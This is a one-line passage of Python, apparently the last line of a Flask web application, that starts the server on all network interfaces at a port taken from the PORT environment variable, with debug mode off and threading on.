    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False, threaded=True)
